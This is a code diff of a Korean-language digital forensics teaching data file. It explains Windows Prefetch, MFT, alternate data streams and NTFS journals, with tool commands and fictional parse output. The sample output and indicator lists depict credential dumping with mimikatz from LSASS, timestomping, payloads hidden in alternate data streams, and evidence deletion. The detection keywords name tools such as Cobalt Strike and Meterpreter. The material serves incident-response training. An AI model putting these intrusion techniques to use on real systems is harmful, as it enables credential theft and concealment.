@@ -386,17 +386,21 @@ const ARTIFACTS_DETAIL = [
       { path:"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Memory Management\\\\PrefetchParameters", desc:"EnablePrefetcher 값: 0=비활성, 1=앱만, 2=부팅만, 3=전체활성(기본)" },
     ],
     tools:[
-      { name:"PECmd", desc:"Eric Zimmerman. 단일/폴더 전체 파싱. CSV·JSON·HTML 출력", cmd:"PECmd.exe -d C:\\\\Windows\\\\Prefetch --csv output\\\\ --csvf prefetch.csv --mp" },
-      { name:"PECmd (단일 파일)", desc:"특정 .pf 파일 상세 분석", cmd:"PECmd.exe -f \"C:\\Windows\\Prefetch\\MIMIKATZ.EXE-3B7D2F1A.pf\" --json output\\" },
-      { name:"WinPrefetchView", desc:"GUI 도구. 빠른 검토용", cmd:"(GUI 실행)" },
+      { name:"PECmd", desc:"Eric Zimmerman. 단일/폴더 전체 파싱. CSV·JSON·HTML 출력", cmd:`PECmd.exe -d C:\\Windows\\Prefetch --csv output\\ --csvf prefetch.csv --mp` },
+      { name:"PECmd (단일 파일)", desc:"특정 .pf 파일 상세 분석", cmd:`PECmd.exe -f "C:\Windows\Prefetch\MIMIKATZ.EXE-3B7D2F1A.pf" --json output\` },
+      { name:"WinPrefetchView", desc:"GUI 도구. 빠른 검토용", cmd:`(GUI 실행)` },
       { name:"Autopsy", desc:"통합 포렌식 플랫폼 — Prefetch 자동 파싱 + 타임라인 통합" },
-      { name:"Velociraptor", desc:"원격 라이브 수집", cmd:"velociraptor artifacts collect Windows.Forensics.Prefetch" },
+      { name:"Velociraptor", desc:"원격 라이브 수집", cmd:`velociraptor artifacts collect Windows.Forensics.Prefetch` },
     ],
     keyItems:[
       {
         name:"실행 파일 경로 & 이름", threat:true,
         desc:"PF 파일에서 원본 실행 파일의 전체 경로와 이름을 추출.",
-        parse_output:"Source Name                          Source Created          Source Modified        Run Count  Last Run                 Volume Path\n---------------------------------------------------------------------------------------------------------------------------\nMIMIKATZ.EXE-3B7D2F1A.pf            2024-09-02 10:44        2024-09-02 10:44       1          2024-09-02 10:44         \\\\VOLUME{...}\\\nSVCUPD.EXE-C4F8A2E1.pf              2024-09-02 09:32        2024-09-02 09:32       5          2024-09-02 11:30         \\\\VOLUME{...}\\\nPOWERSHELL.EXE-7EC4A3D2.pf          2023-01-10 08:00        2024-09-02 09:31       47         2024-09-02 09:31         \\\\VOLUME{...}\\",
+        parse_output:`Source Name                          Source Created          Source Modified        Run Count  Last Run                 Volume Path
+---------------------------------------------------------------------------------------------------------------------------
+MIMIKATZ.EXE-3B7D2F1A.pf            2024-09-02 10:44        2024-09-02 10:44       1          2024-09-02 10:44         \\VOLUME{...}\
+SVCUPD.EXE-C4F8A2E1.pf              2024-09-02 09:32        2024-09-02 09:32       5          2024-09-02 11:30         \\VOLUME{...}\
+POWERSHELL.EXE-7EC4A3D2.pf          2023-01-10 08:00        2024-09-02 09:31       47         2024-09-02 09:31         \\VOLUME{...}\`,
         interpretation:[
           { field:"Source Name (파일명)", meaning:"PF 파일명에서 실행 파일명 추출. MIMIKATZ, PROCDUMP, METERPRETER, COBALTSTRIKE 등 공격 도구명 직접 검색" },
           { field:"Run Count (실행 횟수)", meaning:"총 실행 횟수. 1회면 최초 실행 후 삭제 의심. 수십 회면 자동 재실행 또는 스크립트에서 반복 호출" },
@@ -404,33 +408,46 @@ const ARTIFACTS_DETAIL = [
           { field:"Source Created (PF 생성 시간)", meaning:"처음 실행된 시간과 동일. 악성코드 최초 실행 시점 특정" },
           { field:"Volume Path", meaning:"실행 당시 마운트된 볼륨 경로. USB 실행이면 이동식 볼륨 경로 기록" },
         ],
-        forensic:"삭제된 악성 파일도 PF 파일이 남아 있으면 실행 사실을 증명할 수 있다. 파일을 지워도 증거는 남는다.",
-        ioc:"C:\\\\Windows\\\\Temp, C:\\\\ProgramData, C:\\Users\\\\...\\\\AppData\\\\Local\\\\Temp 경로 .exe 실행 이력",
+        forensic:`삭제된 악성 파일도 PF 파일이 남아 있으면 실행 사실을 증명할 수 있다. 파일을 지워도 증거는 남는다.`,
+        ioc:`C:\\Windows\\Temp, C:\\ProgramData, C:\Users\\...\\AppData\\Local\\Temp 경로 .exe 실행 이력`,
       },
       {
         name:"최근 8회 실행 시간", threat:false,
         desc:"Windows Vista 이후 최근 8회 실행 시간이 모두 기록됨. 공격 빈도와 패턴 파악 가능.",
-        parse_output:"파일명: SVCUPD.EXE-C4F8A2E1.pf\nRun 1: 2024-09-02 09:32:11 UTC\nRun 2: 2024-09-02 09:35:44 UTC\nRun 3: 2024-09-02 10:18:03 UTC\nRun 4: 2024-09-03 00:00:01 UTC  ← 자동 재실행 패턴 (자정)\nRun 5: 2024-09-04 00:00:02 UTC\nRun 6: 2024-09-05 00:00:01 UTC\nRun 7: 2024-09-06 00:00:03 UTC\nRun 8: 2024-09-07 00:00:01 UTC",
+        parse_output:`파일명: SVCUPD.EXE-C4F8A2E1.pf
+Run 1: 2024-09-02 09:32:11 UTC
+Run 2: 2024-09-02 09:35:44 UTC
+Run 3: 2024-09-02 10:18:03 UTC
+Run 4: 2024-09-03 00:00:01 UTC  ← 자동 재실행 패턴 (자정)
+Run 5: 2024-09-04 00:00:02 UTC
+Run 6: 2024-09-05 00:00:01 UTC
+Run 7: 2024-09-06 00:00:03 UTC
+Run 8: 2024-09-07 00:00:01 UTC`,
         interpretation:[
           { field:"실행 간격 패턴", meaning:"일정 간격(매일 자정 등) 반복 실행 → 예약 작업 또는 자동 재실행 메커니즘 존재" },
           { field:"실행 시간대", meaning:"새벽 시간대 집중 실행 → 사람이 직접 실행한 것이 아닌 자동화 의심" },
           { field:"첫 실행 vs 마지막 실행 간격", meaning:"짧으면 단순 테스트 / 길면 장기간 지속 활동" },
         ],
-        forensic:"규칙적 실행 패턴(매일 00:00:01)은 예약 작업을 통한 지속성 확보. 이벤트 로그 4698(예약 작업 생성)과 교차 확인.",
-        ioc:"매일 자정 정각 실행, 업무 시간 외 새벽 반복 실행 패턴",
+        forensic:`규칙적 실행 패턴(매일 00:00:01)은 예약 작업을 통한 지속성 확보. 이벤트 로그 4698(예약 작업 생성)과 교차 확인.`,
+        ioc:`매일 자정 정각 실행, 업무 시간 외 새벽 반복 실행 패턴`,
       },
       {
         name:"접근 파일 목록", threat:true,
         desc:"해당 프로그램이 실행되면서 접근(읽기·쓰기)한 파일 목록. 악성코드의 행동 반경 파악 핵심.",
-        parse_output:"파일명: MIMIKATZ.EXE-3B7D2F1A.pf  접근 파일 목록:\n\\\\WINDOWS\\\\SYSTEM32\\\\LSASS.EXE        ← 자격증명 덤프 대상\n\\\\WINDOWS\\\\SYSTEM32\\\\NTDLL.DLL\n\\\\WINDOWS\\\\SYSTEM32\\\\CRYPTDLL.DLL\n\\\\WINDOWS\\\\TEMP\\\\LSS.DMP             ← 덤프 파일 생성 경로\n\\\\PROGRAMDATA\\\\MICROSOFTUPDATE\\\\SVCUPD.CFG  ← C2 설정 파일 접근",
+        parse_output:`파일명: MIMIKATZ.EXE-3B7D2F1A.pf  접근 파일 목록:
+\\WINDOWS\\SYSTEM32\\LSASS.EXE        ← 자격증명 덤프 대상
+\\WINDOWS\\SYSTEM32\\NTDLL.DLL
+\\WINDOWS\\SYSTEM32\\CRYPTDLL.DLL
+\\WINDOWS\\TEMP\\LSS.DMP             ← 덤프 파일 생성 경로
+\\PROGRAMDATA\\MICROSOFTUPDATE\\SVCUPD.CFG  ← C2 설정 파일 접근`,
         interpretation:[
           { field:"lsass.exe 접근", meaning:"자격증명 탈취 시도. Mimikatz, ProcDump 등이 LSASS 프로세스 메모리에 접근 시 기록" },
           { field:".dmp 파일 접근", meaning:"메모리 덤프 파일 생성 또는 읽기. 덤프 파일 경로와 이름이 직접 기록됨" },
           { field:"비정상 설정 파일 접근", meaning:"C2 설정·암호화 키·페이로드 파일에 접근한 흔적. 악성코드 동작 방식 파악 가능" },
           { field:"네트워크 드라이브 경로", meaning:"\\\\\\서버\\\\공유 형태 경로가 있으면 네트워크를 통한 파일 접근 또는 측면 이동" },
         ],
-        forensic:"접근 파일 목록으로 악성코드가 무엇을 했는지 역추적 가능. 설정 파일·덤프 파일 경로를 MFT에서 추가 확인.",
-        ioc:"LSASS.EXE 접근, .dmp 파일 생성, \\\\\\내부서버\\\\공유 경로 접근",
+        forensic:`접근 파일 목록으로 악성코드가 무엇을 했는지 역추적 가능. 설정 파일·덤프 파일 경로를 MFT에서 추가 확인.`,
+        ioc:`LSASS.EXE 접근, .dmp 파일 생성, \\\내부서버\\공유 경로 접근`,
       },
     ],
     tips:[
@@ -459,12 +476,12 @@ const ARTIFACTS_DETAIL = [
       { path:"C:\\\\$Boot", desc:"볼륨 부트 레코드 — NTFS 버전·클러스터 크기·$MFT 위치 등 기록" },
     ],
     tools:[
-      { name:"MFTECmd ($MFT)", desc:"Eric Zimmerman. $MFT 전체 파싱. CSV/JSON 출력", cmd:"MFTECmd.exe -f \"C:\\$MFT\" --csv output\\\\ --csvf mft.csv" },
-      { name:"MFTECmd ($J 스트림)", desc:"$UsnJrnl 저널 파싱. 파일 변경 이벤트 전체 추출", cmd:"MFTECmd.exe -f \"C:\\$Extend\\$UsnJrnl:$J\" --csv output\\\\ --csvf usnjrnl.csv" },
-      { name:"MFTECmd ($LogFile)", desc:"$LogFile 트랜잭션 파싱", cmd:"MFTECmd.exe -f \"C:\\$LogFile\" --csv output\\\\ --csvf logfile.csv" },
-      { name:"MFTECmd (--body)", desc:"log2timeline 형식으로 타임라인 통합 출력", cmd:"MFTECmd.exe -f \"C:\\$MFT\" --body output\\\\ --bodyf mft_body.txt" },
+      { name:"MFTECmd ($MFT)", desc:"Eric Zimmerman. $MFT 전체 파싱. CSV/JSON 출력", cmd:`MFTECmd.exe -f "C:\$MFT" --csv output\\ --csvf mft.csv` },
+      { name:"MFTECmd ($J 스트림)", desc:"$UsnJrnl 저널 파싱. 파일 변경 이벤트 전체 추출", cmd:`MFTECmd.exe -f "C:\$Extend\$UsnJrnl:$J" --csv output\\ --csvf usnjrnl.csv` },
+      { name:"MFTECmd ($LogFile)", desc:"$LogFile 트랜잭션 파싱", cmd:`MFTECmd.exe -f "C:\$LogFile" --csv output\\ --csvf logfile.csv` },
+      { name:"MFTECmd (--body)", desc:"log2timeline 형식으로 타임라인 통합 출력", cmd:`MFTECmd.exe -f "C:\$MFT" --body output\\ --bodyf mft_body.txt` },
       { name:"Autopsy", desc:"MFT 자동 파싱 + 타임라인 뷰 + 삭제 파일 복구 통합 제공" },
-      { name:"Velociraptor", desc:"라이브 수집 및 원격 MFT 분석. NTFS artifact 활용", cmd:"velociraptor artifacts collect Windows.NTFS.MFT" },
+      { name:"Velociraptor", desc:"라이브 수집 및 원격 MFT 분석. NTFS artifact 활용", cmd:`velociraptor artifacts collect Windows.NTFS.MFT` },
     ],
     // keyItems에 파일별 섹션 구분 플래그 추가
     fileSections:[
@@ -478,7 +495,17 @@ const ARTIFACTS_DETAIL = [
         file:"$MFT",
         name:"MFT 레코드 구조 (파일 메타데이터)", threat:false,
         desc:"파일 1개 = MFT 레코드 1개(1024B). 레코드 내 속성($STANDARD_INFORMATION, $FILE_NAME, $DATA 등)에 타임스탬프·크기·경로·내용이 저장된다.",
-        parse_output:"[MFTECmd CSV 출력 — 주요 컬럼]\nEntryNumber  FileName         InUse  ParentPath                    FileSize   Created($SI)          Modified($SI)         Changed($SI)          Accessed($SI)\n                                                                             Created($FN)          Modified($FN)         Changed($FN)          Accessed($FN)\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n847261       svcupd.exe       True   C:\\\\ProgramData\\\\MicrosoftUpdate  251904     2024-09-02 09:32:11   2024-09-02 09:32:11   2024-09-02 09:33:15   2024-09-02 09:32:00\n                                                                             2024-09-02 09:32:11   2024-09-02 09:32:11   2024-09-02 09:32:11   2024-09-02 09:32:11\n851334       lss.dmp          False  C:\\\\Windows\\\\Temp                 43237376   2024-09-02 10:44:17   2024-09-02 10:44:17   2024-09-02 10:44:17   2024-09-02 10:44:17\n                                                                             2024-09-02 10:44:17   2024-09-02 10:44:17   2024-09-02 10:44:17   2024-09-02 10:44:17\n847400       malware_fake.exe True   C:\\\\Windows\\\\System32             245760     2019-01-15 08:00:00   2019-01-15 08:00:00   2024-09-02 09:32:30   2024-09-02 09:32:00\n                                                                             2024-09-02 09:32:11   2024-09-02 09:32:11   2024-09-02 09:32:11   2024-09-02 09:32:11\n                                                                             ↑ $FN은 실제 드롭 시간  ↑$SI만 과거로 조작 → Timestomping!",
+        parse_output:`[MFTECmd CSV 출력 — 주요 컬럼]
+EntryNumber  FileName         InUse  ParentPath                    FileSize   Created($SI)          Modified($SI)         Changed($SI)          Accessed($SI)
+                                                                             Created($FN)          Modified($FN)         Changed($FN)          Accessed($FN)
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+847261       svcupd.exe       True   C:\\ProgramData\\MicrosoftUpdate  251904     2024-09-02 09:32:11   2024-09-02 09:32:11   2024-09-02 09:33:15   2024-09-02 09:32:00
+                                                                             2024-09-02 09:32:11   2024-09-02 09:32:11   2024-09-02 09:32:11   2024-09-02 09:32:11
+851334       lss.dmp          False  C:\\Windows\\Temp                 43237376   2024-09-02 10:44:17   2024-09-02 10:44:17   2024-09-02 10:44:17   2024-09-02 10:44:17
+                                                                             2024-09-02 10:44:17   2024-09-02 10:44:17   2024-09-02 10:44:17   2024-09-02 10:44:17
+847400       malware_fake.exe True   C:\\Windows\\System32             245760     2019-01-15 08:00:00   2019-01-15 08:00:00   2024-09-02 09:32:30   2024-09-02 09:32:00
+                                                                             2024-09-02 09:32:11   2024-09-02 09:32:11   2024-09-02 09:32:11   2024-09-02 09:32:11
+                                                                             ↑ $FN은 실제 드롭 시간  ↑$SI만 과거로 조작 → Timestomping!`,
         interpretation:[
           { field:"EntryNumber (MFT 레코드 번호)", meaning:"파일마다 고유 번호. $UsnJrnl의 EntryId와 매핑하면 동일 파일의 생성~삭제 전체 이력 추적 가능" },
           { field:"InUse=True/False", meaning:"True=현재 존재 / False=삭제됨. False여도 레코드가 재사용 전이면 메타데이터 전체 확인 가능. 이것이 '삭제 파일 복구'의 원리" },
@@ -487,43 +514,70 @@ const ARTIFACTS_DETAIL = [
           { field:"ParentPath (부모 경로)", meaning:"파일이 속한 폴더 경로. 비정상 경로(C:\\\\Temp, C:\\\\ProgramData, C:\\\\Windows\\\\Temp) 파일 집중 분석" },
           { field:"FileSize=0 + InUse=True", meaning:"파일은 존재하지만 크기가 0 → 내용이 삭제되거나 비워진 것. 공격자가 증거 인멸을 위해 내용만 삭제한 패턴" },
         ],
-        forensic:"$SI와 $FN 타임스탬프 차이 = Timestomping 확정 증거. $FN 기준으로 실제 침해 시간 재구성. InUse=False 파일의 메타데이터로 삭제된 악성 파일 목록 복원.",
-        ioc:"$SI_Created 수년 전 + $FN_Created 침해 시점, C:\\\\Temp·AppData 경로 .exe InUse=False",
+        forensic:`$SI와 $FN 타임스탬프 차이 = Timestomping 확정 증거. $FN 기준으로 실제 침해 시간 재구성. InUse=False 파일의 메타데이터로 삭제된 악성 파일 목록 복원.`,
+        ioc:`$SI_Created 수년 전 + $FN_Created 침해 시점, C:\\Temp·AppData 경로 .exe InUse=False`,
       },
       {
         file:"$MFT",
         name:"ADS (대체 데이터 스트림)", threat:true,
         desc:"NTFS는 파일 하나에 여러 개의 데이터 스트림($DATA 속성)을 가질 수 있다. 기본 스트림 외 숨겨진 스트림에 악성 페이로드를 숨길 수 있다.",
-        parse_output:"[MFTECmd — ADS(대체 데이터 스트림) 포함 출력]\nEntryNumber  FileName              StreamName          StreamSize   InUse  경로\n-----------------------------------------------------------------------------------------------\n847500       readme.txt            (기본 스트림)        1024         True   C:\\Users\\victim\\\\Desktop\\\n847500       readme.txt            :hidden_payload      245760       True   ← ADS에 실행파일 숨김!\n847501       legitimate.jpg        (기본 스트림)        102400       True   C:\\Users\\victim\\\\Pictures\\\n847501       legitimate.jpg        :Zone.Identifier     196          True   ← 정상 (인터넷 다운로드 표시)\n847502       normal_doc.docx       (기본 스트림)        50000        True   C:\\Users\\victim\\\\Documents\\\n847502       normal_doc.docx       :shellcode.exe       102400       True   ← 악성 ADS!",
+        parse_output:`[MFTECmd — ADS(대체 데이터 스트림) 포함 출력]
+EntryNumber  FileName              StreamName          StreamSize   InUse  경로
+-----------------------------------------------------------------------------------------------
+847500       readme.txt            (기본 스트림)        1024         True   C:\Users\victim\\Desktop\
+847500       readme.txt            :hidden_payload      245760       True   ← ADS에 실행파일 숨김!
+847501       legitimate.jpg        (기본 스트림)        102400       True   C:\Users\victim\\Pictures\
+847501       legitimate.jpg        :Zone.Identifier     196          True   ← 정상 (인터넷 다운로드 표시)
+847502       normal_doc.docx       (기본 스트림)        50000        True   C:\Users\victim\\Documents\
+847502       normal_doc.docx       :shellcode.exe       102400       True   ← 악성 ADS!`,
         interpretation:[
           { field:"StreamName이 비어있음", meaning:"기본 데이터 스트림($DATA). 일반적으로 파일 내용이 저장되는 곳" },
           { field:":Zone.Identifier", meaning:"인터넷에서 다운로드된 파일에 자동 생성되는 정상 ADS. ZoneId=3이면 인터넷 다운로드. 이 값이 없는 .exe는 직접 복사되거나 프로그래밍으로 생성된 것" },
           { field:":hidden_payload, :shellcode.exe 등", meaning:"정상 파일에 숨겨진 악성 페이로드. dir 명령이나 탐색기에서 보이지 않음. type readme.txt:hidden_payload로 실행 가능" },
           { field:"StreamSize vs 파일 크기", meaning:"기본 스트림 크기와 전체 파일 크기가 다르면 ADS 존재. 탐색기에서 표시되는 크기는 기본 스트림만 반영" },
         ],
-        forensic:"MFTECmd의 --ads 옵션으로 대체 데이터 스트림 전체 열거. Zone.Identifier 없는 .exe = 인터넷 다운로드 흔적 없음 → 내부 전달 또는 메모리에서 드롭된 파일.",
-        ioc:"정상 파일(txt, jpg, docx 등)에 .exe .dll .bat 스트림 존재, StreamSize 비정상적으로 큰 경우",
+        forensic:`MFTECmd의 --ads 옵션으로 대체 데이터 스트림 전체 열거. Zone.Identifier 없는 .exe = 인터넷 다운로드 흔적 없음 → 내부 전달 또는 메모리에서 드롭된 파일.`,
+        ioc:`정상 파일(txt, jpg, docx 등)에 .exe .dll .bat 스트림 존재, StreamSize 비정상적으로 큰 경우`,
       },
       {
         file:"$MFT",
         name:"삭제 파일 복구 분석", threat:false,
         desc:"InUse=False 레코드 분석으로 삭제된 파일의 메타데이터를 복원. 파일 내용 복구는 클러스터 덮어쓰기 여부에 따라 다름.",
-        parse_output:"[삭제된 파일 목록 — InUse=False 필터링 결과]\nEntryNumber  FileName         FileSize    $FN_Created           $FN_Modified          ParentPath                  IsOrphan\n-------------------------------------------------------------------------------------------------------------------------------------------\n851334       lss.dmp          43237376    2024-09-02 10:44:17   2024-09-02 10:44:17   C:\\\\Windows\\\\Temp\\\\             False\n918822       svcupd.exe       251904      2024-09-02 09:32:11   2024-09-02 09:32:11   C:\\\\ProgramData\\\\MicrosoftUpdate  False\n918823       svcupd.cfg       8192        2024-09-02 09:32:11   2024-09-02 09:32:11   C:\\\\ProgramData\\\\MicrosoftUpdate  False\n918901       tmp_arch.7z      487221843   2024-09-10 22:28:00   2024-09-10 22:28:00   C:\\\\ProgramData\\\\               False\n             (이름 없음)       4096        2024-09-15 03:10:00   2024-09-15 03:10:00   (고아 레코드)                  True  ← IsOrphan",
+        parse_output:`[삭제된 파일 목록 — InUse=False 필터링 결과]
+EntryNumber  FileName         FileSize    $FN_Created           $FN_Modified          ParentPath                  IsOrphan
+-------------------------------------------------------------------------------------------------------------------------------------------
+851334       lss.dmp          43237376    2024-09-02 10:44:17   2024-09-02 10:44:17   C:\\Windows\\Temp\\             False
+918822       svcupd.exe       251904      2024-09-02 09:32:11   2024-09-02 09:32:11   C:\\ProgramData\\MicrosoftUpdate  False
+918823       svcupd.cfg       8192        2024-09-02 09:32:11   2024-09-02 09:32:11   C:\\ProgramData\\MicrosoftUpdate  False
+918901       tmp_arch.7z      487221843   2024-09-10 22:28:00   2024-09-10 22:28:00   C:\\ProgramData\\               False
+             (이름 없음)       4096        2024-09-15 03:10:00   2024-09-15 03:10:00   (고아 레코드)                  True  ← IsOrphan`,
         interpretation:[
           { field:"InUse=False + FileSize > 0", meaning:"삭제됐지만 클러스터를 아직 덮어쓰지 않았을 가능성. 파일 내용 복구 시도 가치 있음. 단, SSD의 TRIM 기능이 활성화됐다면 복구 불가" },
           { field:"IsOrphan=True", meaning:"부모 디렉토리 레코드도 삭제된 '고아' 파일. 폴더 구조 없이 파일만 남은 상태. 공격자가 폴더째로 삭제 시 발생" },
           { field:"$FN 타임스탬프 (삭제 파일)", meaning:"삭제된 파일도 $FN 타임스탬프는 유지. 악성 파일의 원본 생성·수정 시간 확인 가능" },
           { field:"tmp_arch.7z FileSize=487MB", meaning:"유출 압축 파일 크기와 SRUM 송신량(487MB)이 일치하면 유출 파일 확정 증거" },
         ],
-        forensic:"삭제 파일의 $FN 타임스탬프 + $UsnJrnl FileDelete 이벤트 + 파일 크기 3종 교차로 '언제, 무엇을, 얼마나 컸는지' 모두 증명.",
-        ioc:"침해 종료 시점(03:00~04:00) 대용량 파일·악성파일 일괄 삭제 패턴",
+        forensic:`삭제 파일의 $FN 타임스탬프 + $UsnJrnl FileDelete 이벤트 + 파일 크기 3종 교차로 '언제, 무엇을, 얼마나 컸는지' 모두 증명.`,
+        ioc:`침해 종료 시점(03:00~04:00) 대용량 파일·악성파일 일괄 삭제 패턴`,
       },
       // ── $LogFile 항목 ──
       {
         file:"$LogFile",
         name:"$LogFile 트랜잭션 로그", threat:false,
         desc:"NTFS가 파일시스템 일관성을 위해 모든 메타데이터 변경을 트랜잭션으로 기록하는 로그. 매우 빠르게 롤오버되므로 최근 수십 분~수 시간 이내의 이벤트만 확인 가능.",
-        parse_output:"[MFTECmd $LogFile 파싱 결과]\nClientLsn    TransactionId  Redo               Undo              FileName         Timestamp\n-----------------------------------------------------------------------------------------------\n0x1A2B3C4D   0x00001234     CreateFile         DeleteFile        svcupd.exe       2024-09-15 03:12:40\n0x1A2B3C4E   0x00001234     DeleteFile         CreateFile        svcupd.exe       2024-09-15 03:12:44  ← 삭제 완료\n0x1A2B3C4F   0x00001235     SetFileInfo        SetFileInfo       lss.dmp          2024-09-15 03:12:45\n0x1A2B3C50   0x00001235     DeleteFile         CreateFile        lss.dmp          2024-09-15 03:12:46\n0x1A2B3C51   0x00001236     RenameFile         RenameFile        malware→svchost  2024-09-02 09:32:05  ← 이름 변경!\n\n[LSN 시퀀스 번호]\n현재 LSN:     0x1F3A8C00  (최신 로그 위치)\n첫 LSN:       0x1A2B0000  (이 이전은 롤오버로 손실)\n로그 크기:    65536 KB (64 MB)",
+        parse_output:`[MFTECmd $LogFile 파싱 결과]
+ClientLsn    TransactionId  Redo               Undo              FileName         Timestamp
+-----------------------------------------------------------------------------------------------
+0x1A2B3C4D   0x00001234     CreateFile         DeleteFile        svcupd.exe       2024-09-15 03:12:40
+0x1A2B3C4E   0x00001234     DeleteFile         CreateFile        svcupd.exe       2024-09-15 03:12:44  ← 삭제 완료
+0x1A2B3C4F   0x00001235     SetFileInfo        SetFileInfo       lss.dmp          2024-09-15 03:12:45
+0x1A2B3C50   0x00001235     DeleteFile         CreateFile        lss.dmp          2024-09-15 03:12:46
+0x1A2B3C51   0x00001236     RenameFile         RenameFile        malware→svchost  2024-09-02 09:32:05  ← 이름 변경!
+
+[LSN 시퀀스 번호]
+현재 LSN:     0x1F3A8C00  (최신 로그 위치)
+첫 LSN:       0x1A2B0000  (이 이전은 롤오버로 손실)
+로그 크기:    65536 KB (64 MB)`,
         interpretation:[
           { field:"ClientLsn (로그 시퀀스 번호)", meaning:"단조 증가하는 고유 번호. 번호 순서로 파일시스템 작업의 정확한 순서 재구성 가능" },
           { field:"Redo / Undo 작업", meaning:"Redo=작업 내용, Undo=롤백 내용. CreateFile-DeleteFile 쌍이면 파일이 생성됐다가 삭제된 것" },
@@ -531,15 +585,31 @@ const ARTIFACTS_DETAIL = [
           { field:"RenameFile 이벤트", meaning:"파일 이름 변경 기록. 악성 파일이 정상 파일명으로 위장하거나, 파일 이름을 바꾸어 탐지 우회하는 패턴 탐지" },
           { field:"로그 롤오버 (손실 구간)", meaning:"$LogFile 크기(기본 64MB) 초과 시 오래된 레코드 덮어씀. 롤오버 발생 시 롤오버 이전 이벤트 손실. $UsnJrnl이 더 오래 유지됨" },
         ],
-        forensic:"$LogFile은 롤오버가 빠르므로 수집 우선순위는 낮음. 그러나 최근 수십 분 이내 파일명 변경·삭제 순서 재구성에는 $UsnJrnl보다 세밀한 정보 제공.",
-        ioc:"Redo=DeleteFile 대량 발생, RenameFile로 악성→정상 이름 변경, 트랜잭션 ID 단위 일괄 삭제",
+        forensic:`$LogFile은 롤오버가 빠르므로 수집 우선순위는 낮음. 그러나 최근 수십 분 이내 파일명 변경·삭제 순서 재구성에는 $UsnJrnl보다 세밀한 정보 제공.`,
+        ioc:`Redo=DeleteFile 대량 발생, RenameFile로 악성→정상 이름 변경, 트랜잭션 ID 단위 일괄 삭제`,
       },
       // ── $UsnJrnl 항목 ──
       {
         file:"$UsnJrnl",
         name:"$UsnJrnl:$J 변경 저널 — 파일 변경 이벤트", threat:true,
         desc:"파일 생성·수정·삭제·이름변경 등 모든 파일시스템 이벤트를 USN(Update Sequence Number) 순서로 기록. $LogFile보다 훨씬 오래 유지(수십~수백 MB). 삭제 증거 복원의 핵심.",
-        parse_output:"[MFTECmd $J 파싱 결과 — 주요 컬럼]\nTimeStamp(UTC)          EntryId    ParentEntryId  EntryName             Reason                                          Extension  IsDirectory\n------------------------------------------------------------------------------------------------------------------------------------------------------------------\n2024-09-02 09:32:11     847261     847200         svcupd.exe            FileCreate                                      .exe       False\n2024-09-02 09:32:11     847262     847200         svcupd.cfg            FileCreate                                      .cfg       False\n2024-09-02 09:33:15     847261     847200         svcupd.exe            BasicInfoChange                                 .exe       False  ← 타임스탬프 변경!\n2024-09-02 09:35:01     847263     847200         config.dat            FileCreate|StreamChange                         .dat       False\n2024-09-02 10:44:17     851334     40961          lss.dmp               FileCreate|DataExtend|Close                     .dmp       False\n2024-09-02 11:15:00     852100     40000          RD-SRV-002            RenameOldName                                   (없음)     False\n2024-09-02 11:15:00     852101     40000          RD-SRV-002.rdp        RenameNewName                                   .rdp       False  ← 이름 변경!\n2024-09-03 14:22:01     854200     40961          Staging               DirectoryCreate                                 (없음)     True   ← 폴더 생성!\n2024-09-10 22:28:00     891200     40961          7z.exe                FileCreate                                      .exe       False  ← 압축 도구 드롭\n2024-09-10 22:28:30     891201     40961          tmp_arch.7z           FileCreate|DataExtend|Close                     .7z        False\n2024-09-15 03:12:40     918820     847200         MicrosoftUpdate       DirectoryDelete|Close                           (없음)     True   ← 폴더 삭제!\n2024-09-15 03:12:44     918822     847200         svcupd.exe            FileDelete|Close                                .exe       False  ← 파일 삭제!\n2024-09-15 03:12:45     918823     40961          lss.dmp               FileDelete|Close                                .dmp       False\n2024-09-15 03:12:46     918901     40961          tmp_arch.7z           FileDelete|Close                                .7z        False",
+        parse_output:`[MFTECmd $J 파싱 결과 — 주요 컬럼]
+TimeStamp(UTC)          EntryId    ParentEntryId  EntryName             Reason                                          Extension  IsDirectory
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+2024-09-02 09:32:11     847261     847200         svcupd.exe            FileCreate                                      .exe       False
+2024-09-02 09:32:11     847262     847200         svcupd.cfg            FileCreate                                      .cfg       False
+2024-09-02 09:33:15     847261     847200         svcupd.exe            BasicInfoChange                                 .exe       False  ← 타임스탬프 변경!
+2024-09-02 09:35:01     847263     847200         config.dat            FileCreate|StreamChange                         .dat       False
+2024-09-02 10:44:17     851334     40961          lss.dmp               FileCreate|DataExtend|Close                     .dmp       False
+2024-09-02 11:15:00     852100     40000          RD-SRV-002            RenameOldName                                   (없음)     False
+2024-09-02 11:15:00     852101     40000          RD-SRV-002.rdp        RenameNewName                                   .rdp       False  ← 이름 변경!
+2024-09-03 14:22:01     854200     40961          Staging               DirectoryCreate                                 (없음)     True   ← 폴더 생성!
+2024-09-10 22:28:00     891200     40961          7z.exe                FileCreate                                      .exe       False  ← 압축 도구 드롭
+2024-09-10 22:28:30     891201     40961          tmp_arch.7z           FileCreate|DataExtend|Close                     .7z        False
+2024-09-15 03:12:40     918820     847200         MicrosoftUpdate       DirectoryDelete|Close                           (없음)     True   ← 폴더 삭제!
+2024-09-15 03:12:44     918822     847200         svcupd.exe            FileDelete|Close                                .exe       False  ← 파일 삭제!
+2024-09-15 03:12:45     918823     40961          lss.dmp               FileDelete|Close                                .dmp       False
+2024-09-15 03:12:46     918901     40961          tmp_arch.7z           FileDelete|Close                                .7z        False`,
         interpretation:[
           { field:"Reason: FileCreate", meaning:"새 파일 생성. 악성 파일 드롭 정확한 시점 특정. EntryId로 MFT 레코드와 연결하면 파일 크기·속성도 확인" },
           { field:"Reason: FileDelete | Close", meaning:"파일 삭제 완료. 공격자 철수 시 증거 삭제 목록 완전 복원 가능. MFT InUse=False 레코드와 교차 확인" },
@@ -550,36 +620,74 @@ const ARTIFACTS_DETAIL = [
           { field:"IsDirectory=True", meaning:"폴더에 대한 이벤트. 스테이징 폴더 생성(DirectoryCreate)·삭제(DirectoryDelete) 추적 가능" },
           { field:"EntryId + ParentEntryId", meaning:"MFT 레코드 번호와 부모 폴더 번호. MFT와 조합하면 삭제된 파일의 전체 경로 재구성 가능" },
         ],
-        forensic:"FileCreate→BasicInfoChange 패턴 = Timestomping. FileCreate→FileDelete 쌍 = 존재했다가 삭제된 파일. DirectoryCreate(Staging) = 데이터 수집 스테이징 폴더.",
